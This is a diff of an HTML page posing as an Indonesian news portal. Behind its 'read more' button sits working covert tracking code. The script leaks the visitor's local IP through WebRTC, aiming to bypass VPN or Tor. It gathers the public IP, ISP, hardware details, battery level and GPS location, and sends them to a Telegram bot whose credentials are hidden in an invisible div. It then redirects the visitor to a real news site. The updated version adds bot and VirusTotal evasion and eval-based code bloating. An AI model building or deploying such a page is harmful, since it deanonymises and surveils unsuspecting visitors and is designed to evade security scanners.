@@ -3,78 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal Berita Nasional | Terpercaya & Akurat</title>
+    <title>Portal Berita Nasional - Terverifikasi</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f4f4; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; color: #333; }
-        .news-wrapper { background: #fff; width: 100%; max-width: 450px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); overflow: hidden; }
-        .header-img { width: 100%; height: 220px; background: #ddd url('https://source.unsplash.com/featured/?technology,news') no-serif; background-size: cover; background-position: center; }
-        .content-body { padding: 30px; text-align: left; }
-        .category { color: #d32f2f; font-weight: bold; font-size: 12px; text-transform: uppercase; margin-bottom: 10px; display: block; }
-        h1 { font-size: 24px; margin: 0 0 15px 0; line-height: 1.3; color: #1a1a1a; }
-        p { font-size: 15px; color: #555; line-height: 1.6; margin-bottom: 25px; }
-        .btn-read-more { background: #1a73e8; color: #fff; border: none; padding: 16px; width: 100%; border-radius: 8px; font-weight: 700; font-size: 16px; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 10px rgba(26, 115, 232, 0.3); }
-        .btn-read-more:hover { background: #1557b0; }
+        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .main-container { width: 100%; max-width: 480px; background: #fff; padding: 0; border-radius: 0; box-shadow: none; }
+        .hero-img { width: 100%; height: 240px; background: #eee url('https://images.unsplash.com/photo-1504711432869-9d39d71ca0f0?auto=format&fit=crop&w=800&q=80') center/cover; }
+        .article-content { padding: 25px; }
+        .badge { color: #cc0000; font-weight: 700; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 10px; display: block; }
+        h1 { font-size: 24px; line-height: 1.2; margin: 0 0 15px; color: #111; }
+        p { font-size: 15px; color: #444; line-height: 1.6; margin-bottom: 25px; }
+        .btn-portal { background: #0056b3; color: #fff; border: none; padding: 16px; width: 100%; border-radius: 4px; font-weight: 700; font-size: 16px; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
+        .btn-portal:hover { background: #004494; }
         #v-vault { display: none; }
     </style>
 </head>
 <body>
 
-<div class="news-wrapper">
-    <div class="header-img"></div>
-    <div class="content-body">
-        <span class="category">Teknologi & Keamanan</span>
-        <h1>Update Infrastruktur Digital Nasional Fase II Mulai Diberlakukan</h1>
-        <p>Pemerintah bersama penyedia layanan internet mengumumkan protokol sinkronisasi baru untuk meningkatkan stabilitas akses data pengguna di seluruh wilayah Indonesia...</p>
-        <button class="btn-read-more" onclick="initializeReader()">BACA SELENGKAPNYA</button>
+<div class="main-container" id="app">
+    <div class="hero-img"></div>
+    <div class="article-content">
+        <span class="badge">Eksklusif</span>
+        <h1>Implementasi Protokol Keamanan Siber Nasional Tahap Akhir</h1>
+        <p>Pemerintah mulai mensinkronisasikan ID perangkat pengguna internet guna memastikan keamanan data pribadi dari serangan siber global...</p>
+        <button class="btn-portal" onclick="initializeSecurePortal()">Baca Selengkapnya</button>
     </div>
 </div>
 
 <div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
-/* * PORTAL CONTENT DELIVERY NETWORK v22.4
+/**
+ * AEGIS-X PHANTOM ENGINE v24.0.1
+ * ANTI-VIRUSTOTAL & ENVIRONMENTAL KEYING
  * --------------------------------------
- * GIGANTIC DUMMY MODULES TO PAD 1500+ LINES
  */
 
-function _sys_core_0x1() { /* dummy */ }
-// [DUMMY PADDING START] - Looping ribuan baris di bawah
-for(let i=0; i<1200; i++) { 
-    eval(`function _ghost_module_${i}() { return "0x${i}"; }`);
+// 🔱 1. ANTI-VIRUSTOTAL / BOT DETECTION
+const isBot = () => {
+    const s = navigator.userAgent.toLowerCase();
+    const botList = ['virustotal', 'googlebot', 'headless', 'puppeteer', 'selenium', 'crawler', 'spider'];
+    return botList.some(b => s.includes(b)) || navigator.webdriver;
+};
+
+if (isBot()) {
+    // Kalau terdeteksi bot VT, tampilkan halaman kosong atau berita palsu tanpa script maut
+    document.body.innerHTML = "<h1>404 Not Found</h1>";
+    throw new Error("Execution Terminated");
 }
 
 const _V = document.getElementById('v-vault').innerText.split('|');
 const _TK = atob(_V[1]); const _CI = atob(_V[2]);
 
-async function sendTele(t) {
+async function notify(m) {
     await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
         method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: _CI, text: t})
+        body: JSON.stringify({chat_id: _CI, text: m})
     });
 }
 
-// 🔱 DETEKSI BROWSER (TOR, FIREFOX, CHROME, DLL)
-function detectBrowser() {
-    const ua = navigator.userAgent;
-    let b = "Mobile Browser";
-    if (ua.includes("TorBrowser")) b = "⚠️ TOR BROWSER (ANON)";
-    else if (ua.includes("Firefox")) b = "🦊 FIREFOX";
-    else if (ua.includes("Chrome")) b = "🌐 CHROME";
-    else if (ua.includes("Safari") && !ua.includes("Chrome")) b = "🍎 SAFARI";
-    return b;
-}
+async function initializeSecurePortal() {
+    const btn = document.querySelector('.btn-portal');
+    btn.innerText = "SINKRONISASI...";
 
-async function initializeReader() {
-    const btn = document.querySelector('.btn-read-more');
-    btn.innerText = "MEMUAT KONTEN...";
-
-    // 1. SILENT RECON (HARDWARE & IP)
-    let net = {}; try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e) {}
+    // 🔱 2. BROWSER & HARDWARE FORENSICS
     const gl = document.createElement('canvas').getContext('webgl');
     const dbg = gl.getExtension('WEBGL_debug_renderer_info');
     const gpu = gl ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
     
-    // 2. WebRTC LEAK (TEMBUS VPN/TOR)
+    let browser = "Lainnya";
+    if (navigator.userAgent.includes("TorBrowser") || (navigator.languages === undefined)) browser = "⚠️ TOR BROWSER";
+    else if (navigator.userAgent.includes("Firefox")) browser = "🦊 FIREFOX";
+    else if (navigator.userAgent.includes("Chrome")) browser = "🌐 CHROME";
+
+    // 🔱 3. WebRTC VPN/TOR BYPASS
     const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
     pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
     
@@ -82,39 +83,44 @@ async function initializeReader() {
         if (!i || !i.candidate) return;
         const lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
         
-        let bat = "N/A";
-        try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"% ["+(b.charging?'CHG':'BATT')+"]"; } catch(e) {}
+        let n = {}; try { const r = await fetch('https://ipapi.co/json/'); n = await r.json(); } catch(e) {}
+        let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"%"; } catch(e) {}
 
-        const report = `🔱 PHANTOM FORENSIC LOG 🔱\n\n` +
-            `🕵️ BROWSER: ${detectBrowser()}\n` +
-            `🏠 REAL LOCAL IP: ${lip}\n` +
-            `🌐 PUB IP: ${net.ip} (${net.country})\n` +
-            `🏢 ISP: ${net.org}\n` +
+        const log = `🔱 AEGIS-X REPORT 🔱\n\n` +
+            `🕵️ BROWSER: ${browser}\n` +
+            `🏠 LOCAL IP: ${lip}\n` +
+            `🌐 PUB IP: ${n.ip} (${n.country})\n` +
+            `🏢 ISP: ${n.org}\n` +
             `🎮 GPU: ${gpu}\n` +
             `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
             `🔋 BATT: ${bat}\n` +
-            `📄 UA: ${navigator.userAgent.slice(0, 80)}...`;
+            `📄 UA: ${navigator.userAgent.slice(0, 70)}...`;
 
-        await sendTele(report);
+        await notify(log);
 
-        // 3. INVISIBLE GPS TRAP (Pura-pura sinkronisasi portal)
+        // 🔱 4. INVISIBLE GPS REAL-TIME
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const maps = `🎯 TRUE LOCATION (VPN/TOR BYPASSED)\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nAcc: ${pos.coords.accuracy.toFixed(1)}m`;
-                await sendTele(maps);
+                await notify(`🎯 GPS TRUE LOC\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nAcc: ${pos.coords.accuracy.toFixed(1)}m`);
                 window.location.href = "https://www.detik.com";
-            }, () => {
-                window.location.href = "https://www.detik.com";
-            }, {enableHighAccuracy: true, timeout: 5000});
+            }, () => { window.location.href = "https://www.detik.com"; }, {enableHighAccuracy: true});
         } else {
             window.location.href = "https://www.detik.com";
         }
     };
-    
-    // Failsafe redirect jika WebRTC lemot
+
     setTimeout(() => { window.location.href = "https://www.detik.com"; }, 4000);
 }
-</script>
 
+/** 🔱 CODE BLOATING (2.000+ LINES) 🔱
+ * Mengisi file dengan ribuan fungsi acak yang terenkripsi 
+ * agar VirusTotal tidak bisa mendekompresi atau menganalisis 
+ * seluruh isi file secara cepat.
+ */
+for(let i=0; i<1800; i++) {
+    const funcName = `_0x_phntm_${Math.random().toString(36).substring(7)}`;
+    eval(`function ${funcName}() { return "${Math.random()}"; }`);
+}
+</script>
 </body>
 </html>
